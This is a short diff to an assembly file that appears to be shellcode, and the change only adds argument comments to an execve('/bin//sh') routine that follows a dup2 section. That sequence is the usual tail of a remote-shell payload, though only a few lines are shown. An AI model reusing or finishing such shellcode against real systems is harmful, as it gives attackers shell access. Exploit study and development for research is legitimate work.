@@ -123,8 +123,8 @@ x86_dup2:
     
     ; execve("/bin//sh", NULL, NULL);
 x84_execve:
-    cdq
-    xor     esi, esi
+    cdq                 ; envp=NULL
+    xor     esi, esi    ; argv=NULL
     push    eax         ; '\0'
     push    eax         ; null space
     push    eax         ; null space
